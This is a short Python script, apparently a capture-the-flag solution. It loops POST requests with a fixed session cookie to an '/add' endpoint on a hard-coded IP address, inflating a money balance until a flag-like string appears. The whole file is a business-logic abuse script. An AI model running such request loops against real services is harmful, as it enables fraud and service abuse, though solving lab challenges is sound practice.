import requests as r

head = {
    "Content-Type": "application/json",
    "Cookie": "session=e17950b9-e58e-4844-a6de-30673fada36a"
}

data = {
    "money" : "add"
}

while True:
    res = r.post('http://46.254.20.217:2002/add', headers = head, data = data).text
    print("Result: ",res)
    if "4hsl33p" in res:
        break